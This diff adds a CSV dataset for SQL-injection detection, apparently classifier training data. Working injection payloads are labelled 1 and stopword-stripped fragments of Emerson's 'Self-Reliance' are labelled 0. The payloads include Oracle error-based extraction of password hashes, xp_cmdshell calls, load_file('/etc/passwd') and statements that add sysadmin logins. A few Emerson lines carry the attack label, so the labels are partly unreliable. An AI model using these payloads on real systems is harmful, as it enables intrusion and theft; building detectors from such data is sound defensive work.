@@ -1,0 +1,2058 @@
+Sentence,Label
+a,1
+a' ,1
+a' --,1
+a' or 1 = 1; --,1
+@,1
+?,1
+' and 1 = 0 )  union all,1
+? or 1 = 1 --,1
+x' and userid is NULL; --,1
+x' and email is NULL; --,1
+anything' or 'x' = 'x,1
+x' and 1 =  ( select count ( * )  from tabname ) ; --,1
+x' and members.email is NULL; --,1
+x' or full_name like '%bob%,1
+23 or 1 = 1; --,1
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
+a,1
+1 or 1 = 1,1
+1' or '1' = '1,1
+1 and user_name (  )   =  'dbo',1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
+1'1,1
+1 exec sp_  ( or exec xp_ ),1
+1 and 1 = 1,1
+1' and 1 =  ( select count ( * )  from tablenames ) ; --,1
+"'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )",1
+1 and user_name (  )   =  'dbo',1
+\'; desc users; --,1
+1\'1,1
+1' and non_existant_table  =  '1,1
+' or username is not NULL or username  =  ',1
+"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )  > 116",1
+"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u' --",1
+1 uni/**/on select all from where,1
+’ or ‘1’ = ’1,1
+' or '1' = '1,1
+'||utl_http.request ( 'httP://192.168.1.1/' ) ||',1
+"' || myappadmin.adduser ( 'admin', 'newpass' )  || '",1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = 1  )  )   AND 'i' = 'i,1
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i,1
+" Ah, could pass neutrality! Who thus avoid pledges, observed, observe unaffected, unbiased, unbribable, unaffrighted innocence, must always formidable",0
+" He would utter opinions passing affairs, seen private, necessary, would sink like darts ear men, put fear",0
+" These voices hear solitude, grow faint inaudible enter world",0
+ Society everywhere conspiracy manhood every one members,0
+" Society joint-stock company, members agree, better securing bread shareholder, surrender liberty culture eater",0
+ The virtue request conformity,0
+ Self-reliance aversion,0
+" It loves realities creators, names customs",0
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
+" It may safely trusted proportionate good issues, faithfully imparted, God work made manifest cowards",0
+" A man relieved gay put heart work done best; said done otherwise, shall give peace",0
+ It deliverance deliver,0
+" In attempt genius deserts him; muse befriends; invention, hope",0
+ Trust thyself: every heart vibrates iron string,0
+" Accept place divine providence found you, society contemporaries, connection events",0
+" Great men always done so, confided childlike genius age, betraying perception absolutely trustworthy seated heart, working hands, predominating being",0
+" And men, must accept highest mind transcendent destiny; minors invalids protected corner, cowards fleeing revolution, guides, redeemers, benefactors, obeying Almighty effort, advancing Chaos Dark",0
+" What pretty oracles nature yields us text, face behaviour children, babes, even brutes! That divided rebel mind, distrust sentiment arithmetic computed strength means opposed purpose, not",0
+" Their mind whole, eye yet unconquered, look faces, disconcerted",0
+" Infancy conforms nobody: conform it, one babe commonly makes four five adults prattle play it",0
+" So God armed youth puberty manhood less piquancy charm, made enviable gracious claims put by, stand itself",0
+" Do think youth force, cannot speak me",0
+ Hark! next room voice sufficiently clear emphatic,0
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
+' or 1 = 1--,1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
+( ||6 ),1
+||6,1
+'||'6,1
+"select * from users where id = 1 or ""; ) "" = 1 or 1 = 1 -- 1",1
+"select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",1
+or 1 = 1,1
+' or '1' = '1,1
+; or '1' = '1',1
+""" or isNULL ( 1/0 )  /*",1
+' or '7659' = '7659,1
+""" or isNULL ( 1/0 )  /*",1
+' -- ,1
+' or 1 = 1--,1
+""" or 1 = 1--",1
+' or 1 = 1 /*,1
+or 1 = 1--,1
+' or 'a' = 'a,1
+""" or ""a"" = ""a",1
+' )  or  ( 'a' = 'a,1
+admin' or ',1
+' select * from information_schema.tables--,1
+ )  union select * from information_schema.tables;,1
+' having 1 = 1--,1
+' having 1 = 1--,1
+' group by userid having 1 = 1--,1
+' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --,1
+' or 1 in  ( select @@version ) --,1
+' union all select @@version--,1
+' or 'unusual'  =  'unusual',1
+' or 'something'  =  'some'+'thing',1
+' or 'text'  =  n'text',1
+' or 'something' like 'some%',1
+' or 2 > 1,1
+' or 'text' > 't',1
+' or 'whatever' in  ( 'whatever' ) ,1
+' or 2 between 1 and 3,1
+' or username like char ( 37 ) ;,1
+"' union select * from users where login  =  char ( 114,111,111,116 ) ;",1
+' union select ,1
+password:*/ = 1--,1
+uni/**/on sel/**/ect,1
+'; execute immediate 'sel' || 'ect us' || 'er',1
+'; exec  ( 'sel' + 'ect us' + 'er' ) ,1
+'/**/or/**/1/**/ = /**/1,1
+' or 1/*,1
+or isNULL ( 1/0 )  /*,1
+' or '7659' = '7659,1
+""" or isNULL ( 1/0 )  /*",1
+' -- &password = ,1
+'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login >,1
+@var select @var as var into temp end --,1
+' and 1 in  ( select var from temp ) --,1
+"' union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1
+"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;",1
+"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;",1
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
+create user name identified by 'pass123',1
+create user name identified by pass123 temporary tablespace temp default tablespace users;,1
+' ; drop table temp --,1
+"exec sp_addlogin 'name' , 'password'",1
+"exec sp_addsrvrolemember 'name' , 'sysadmin'",1
+"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )",1
+grant connect to name; grant resource to name;,1
+"insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 )",1
+' or 1 = 1 --,1
+' union  ( select @@version )  --,1
+"' union  ( select NULL,  ( select @@version  )  )   --",1
+"' union  ( select NULL, NULL,  ( select @@version  )  )   --",1
+"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --",1
+"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --",1
+"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --",1
+"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --",1
+"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay '0:0:2' --",1
+"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --",1
+"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --",1
+'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --,1
+'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' --,1
+'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --,1
+'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --,1
+"select * from users where id = 1 or  ( \ )  = 1 union select 1,@@VERSION -- 1",1
+"select * from users where id = 1 or  ( \. )  = 1 union select 1,@@VERSION -- 1",1
+select * from users where id = 1 or  ( \+ )  = 1 or 1 = 1 -- 1,1
+"select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
+"select * from users where id = 1 or  ( \+ )  = 1 union select 1,@@VERSION -- 1",1
+select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1,1
+"select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1",1
+select * from users where id = 1 or \.<\ or 1 = 1 -- 1,1
+select * from users where id = 1 or \.<1 or 1 = 1 -- 1,1
+"select * from users where id = 1 or \.<1 union select 1,@@VERSION -- 1",1
+"select * from users where id = 1 or \.<\ union select 1,@@VERSION -- 1",1
+select * from users where id = 1 or \.<$ or 1 = 1 -- 1,1
+"select * from users where id = 1 or \.<$ union select 1,@@VERSION -- 1",1
+"select * from users where id = 1 or \.<  = 1 union select 1,@@VERSION -- 1",1
+"select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",1
+"select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",1
+select * from users where id = 1   or 1 = 1 -- 1,1
+select * from users where id = 1 or \+<\ or 1 = 1 -- 1,1
+"select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1",1
+"select * from users where id = 1 or \+<\ union select 1,@@VERSION -- 1",1
+"select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1",1
+"select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1",1
+"select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1",1
+select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1,1
+"select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1",1
+select * from users where id = 1 or $<\ or 1 = 1 -- 1,1
+select * from users where id = 1 or $<\. or 1 = 1 -- 1,1
+"select * from users where id = 1 or $<\. union select 1,@@VERSION -- 1",1
+"select * from users where id = 1 or $<\ union select 1,@@VERSION -- 1",1
+select * from users where id = 1 or $+<\ or 1 = 1 -- 1,1
+"select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1",1
+"select * from users where id = 1 or $+<\ union select 1,@@VERSION -- 1",1
+"select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",1
+select * from users where id = 1 or \<\. or 1 = 1 -- 1,1
+"select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",1
+select * from users where id = 1 or \<1 or 1 = 1 -- 1,1
+"select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1",1
+"select * from users where id = 1 or \<\ union select 1,@@VERSION -- 1",1
+"select * from users where id = 1 or \<\ union select null,@@VERSION -- 1",1
+select * from users where id = 1 or \<$ or 1 = 1 -- 1,1
+"select * from users where id = 1 or \<$ union select 1,@@VERSION -- 1",1
+select * from users where id = 1 or \<  = 1 or 1 = 1 -- 1,1
+" I hope somewhat better whim last, cannot spend day explanation",0
+ Expect show cause I seek I exclude company,0
+" Then, again, tell me, good man to-day, obligation put poor men good situations",0
+" Are poor? I tell thee, thou foolish philanthropist, I grudge dollar, dime, cent, I give men belong I belong",0
+" There class persons spiritual affinity I bought sold; I go prison, need be; miscellaneous popular charities; education college fools; building meeting-houses vain end many stand; alms sots; thousandfold Relief Societies; — though I confess shame I sometimes succumb give dollar, wicked dollar I shall manhood withhold",0
+" Virtues are, popular estimate, rather exception rule",0
+ There man virtues,0
+"select * from users where id = 1 + ( \ )  union select null,@@VERSION -- 1",1
+"select * from users where id = 1.&&1 union select 1,version (  )  -- 1",1
+select * from users where id = 1. or 1 = 1 -- 1,1
+"select * from users where id = 1.&&@ union select 1,version (  )  -- 1",1
+select * from users where id = 1 +  ( \. )  or 1 = 1 -- 1,1
+"select * from users where id = 1 +  ( \. )  union select null,@@VERSION -- 1",1
+"select * from users where id = 1.  union select 1,version (  )  -- 1",1
+"select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1",1
+"select * from users where id = 1.  union select version (  ) ,version (  )  -- 1",1
+"select * from users where id = 1. union select null,version (  )  -- 1",1
+"select * from users where id = 1 +\. union select null,@@VERSION -- 1",1
+"select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1",1
+select * from users where id = 1. <@ or 1 = 1 -- 1,1
+select * from users where id = 1.<@. or 1 = 1 -- 1,1
+"select * from users where id = 1.<@. union select 1,version (  )  -- 1",1
+select * from users where id = 1.*1 or 1 = 1 -- 1,1
+"select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1",1
+"select * from users where id = 1.<1# union select 1,version (  )  -- 1",1
+"select * from users where id = 1. <@ union select 1,version (  )  -- 1",1
+"select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1",1
+"select * from users where id = 1.*\ union select null,@@VERSION -- 1",1
+select * from users where id = 1.<@$ or 1 = 1 -- 1,1
+"select * from users where id = 1.<@$ union select 1,version (  )  -- 1",1
+select * from users where id = 1.%@ or 1 = 1 -- 1,1
+"select * from users where id = 1.%@ union select 1,version (  )  -- 1",1
+"select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1",1
+" It harder, always find think know duty better know it",0
+ It easy world live world’s opinion; easy solitude live own; great man midst crowd keeps perfect sweetness independence solitude,0
+" The objection conforming usages become dead is, scatters force",0
+ It loses time blurs impression character,0
+" If maintain dead church, contribute dead Bible-society, vote great party either government it, spread table like base housekeepers, — screens I difficulty detect precise man are",0
+" And, course, much force withdrawn proper life",0
+"select * from users where id = 11<1# union select 1,version (  )  -- 1",1
+select * from users where id = 1 +  ( \+ )  or 1 = 1 -- 1,1
+"select * from users where id = 1 +  ( \+ )  union select null,@@VERSION -- 1",1
+"select * from users where id = 1 +\+. union select null,@@VERSION -- 1",1
+"select * from users where id = 1 -1<@ union select 1,version (  )  -- 1",1
+"select * from users where id = 1 +1<@ union select version (  ) ,version (  )  -- 1",1
+"select * from users where id = 1 +1<@ union select null,version (  )  -- 1",1
+select * from users where id = 1 + \+%\ or 1 = 1 -- 1,1
+select * from users where id = 1 + \+%1 or 1 = 1 -- 1,1
+"select * from users where id = 1 + \+%1 union select null,@@VERSION -- 1",1
+"select * from users where id = 1 + \+*\ union select null,@@VERSION -- 1",1
+select * from users where id = 1 + \+%$ or 1 = 1 -- 1,1
+"select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1",1
+"select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1",1
+" We come wear one cut face figure, acquire degrees gentlest asinine expression",1
+" There mortifying experience particular, fail wreak also general history; I mean foolish face praise, forced smile put company feel ease answer conversation interest us",1
+" The muscles, spontaneously moved, moved low usurping wilfulness, grow tight outline face disagreeable sensation",1
+"select * from users where id = 1 union select 1 $,version (  )  -- 1",1
+" Else, to-morrow stranger say masterly good sense precisely thought felt time, shall forced take shame opinion another",0
+" There time every man’s education arrives conviction envy ignorance; imitation suicide; must take better, worse, portion; though wide universe full good, kernel nourishing corn come toil bestowed plot ground given till",0
+" The power resides new nature, none knows do, know tried",0
+"select * from users where id = 1 union select .1_,version (  )  -- 1",1
+"select * from users where id = 1 union select 1`\`,version (  )  -- 1",1
+"select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1",1
+"select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1",1
+ I suppose man violate nature,0
+" All sallies rounded law being, inequalities Andes Himmaleh insignificant curve sphere",0
+ Nor matter gauge try him,0
+" A character like acrostic Alexandrian stanza; — read forward, backward, across, still spells thing",0
+" In pleasing, contrite wood-life God allows me, let record day day honest thought without prospect retrospect, and, I cannot doubt, found symmetrical, though I mean not, see not",0
+ My book smell pines resound hum insects,0
+ The swallow window interweave thread straw carries bill web also,0
+ We pass are,0
+ Character teaches wills,0
+"select * from users where id = 1 union select @&&@,version (  )  -- 1",1
+"select * from users where id = 1 union select @ 1$,version (  )  -- 1",1
+"select * from users where id = 1 union select  @ $,version (  )  -- 1",1
+"select * from users where id = 1 union select @ 1a,version (  )  -- 1",1
+"select * from users where id = 1 union select @<@$,version (  )  -- 1",1
+"select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1",1
+"select * from users where id = 1 union select @ _,version (  )  -- 1",1
+"select * from users where id = 1 union select @ $_,version (  )  -- 1",1
+"select * from users where id = 1 union select @<@,version (  )  -- 1",1
+"select * from users where id = 1 union select @<@.,version (  )  -- 1",1
+"select * from users where id = 1 union select @ $$,version (  )  -- 1",1
+" Leave theory, Joseph coat hand harlot, flee",0
+" A foolish consistency hobgoblin little minds, adored little statesmen philosophers divines",0
+ With consistency great soul simply nothing do,0
+"select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1",1
+select * from users where id = 1 +$+ or 1 = 1 -- 1,1
+select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1,1
+  Add plain text Ne te quaesiveris extra,0
+" Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late",0
+" Our acts angels are, good ill, Our fatal shadows walk us still",0
+" Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet",0
+ I read day verses written eminent painter original conventional,0
+" The soul always hears admonition lines, let subject may",0
+ The sentiment instil value thought may contain,0
+" To believe thought, believe true private heart true men, — genius",0
+" Speak latent conviction, shall universal sense; inmost due time becomes outmost, — first thought rendered back us trumpets Last Judgment",0
+" Familiar voice mind each, highest merit ascribe Moses, Plato, Milton is, set naught books traditions, spoke men thought",0
+" A man learn detect watch gleam light flashes across mind within, lustre firmament bards sages",0
+" Yet dismisses without notice thought, his",0
+ In every work genius recognize rejected thoughts: come back us certain alienated majesty,0
+ Great works art affecting lesson us this,0
+ They teach us abide spontaneous impression good-humored inflexibility whole cry voices side,0
+"select * from users where id = 1 union select 1||1,version (  )  -- 1",1
+"select * from users where id = 1 union select 1||@,version (  )  -- 1",1
+"select * from users where id = 1 union select 1 1$,version (  )  -- 1",1
+" Not nothing one face, one character, one fact, makes much impression him, another none",0
+ This sculpture memory without preestablished harmony,0
+" The eye placed one ray fall, might testify particular ray",0
+" We half express ourselves, ashamed divine idea us represents",0
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
+"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
+ It seems knows speak contemporaries,0
+" Bashful bold, then, know make us seniors unnecessary",0
+" The nonchalance boys sure dinner, would disdain much lord say aught conciliate one, healthy attitude human nature",0
+" A boy parlour pit playhouse; independent, irresponsible, looking corner people facts pass by, tries sentences merits, swift, summary way boys, good, bad, interesting, silly, eloquent, troublesome",0
+" He cumbers never consequences, interests: gives independent, genuine verdict",0
+ You must court him: court you,0
+" But man is, were, clapped jail consciousness",0
+" As soon acted spoken eclat, committed person, watched sympathy hatred hundreds, whose affections must enter account",0
+ There Lethe this,0
+"select * from users where id = 1 union select @||1,version (  )  -- 1",1
+"select * from users where id = 1 or \<  = 1 union select 1,@@VERSION -- 1",1
+select * from users where id = 1 or !<@ or 1 = 1 -- 1,1
+"select * from users where id = 1 or !<@ union select 1,version (  )  -- 1",1
+"select * from users where id = 1 or @`\` union select 1,version (  )  -- 1",1
+"select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1",1
+"select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1",1
+select * from users where id = 1 + ( \ )  or 1 = 1 -- 1,1
+ Whoso would man must nonconformist,0
+" He would gather immortal palms must hindered name goodness, must explore goodness",0
+ Nothing last sacred integrity mind,0
+" Absolve yourself, shall suffrage world",0
+" I remember answer quite young I prompted make valued adviser, wont importune dear old doctrines church",0
+" On saying, What I sacredness traditions, I live wholly within? friend suggested, — But impulses may below, above",0
+" I replied, They seem such; I Devil’s child, I live Devil",0
+ No law sacred nature,0
+" Good bad names readily transferable this; right constitution, wrong it",0
+" A man carry presence opposition, every thing titular ephemeral he",0
+" I ashamed think easily capitulate badges names, large societies dead institutions",0
+ Every decent well-spoken individual affects sways right,0
+" I ought go upright vital, speak rude truth ways",0
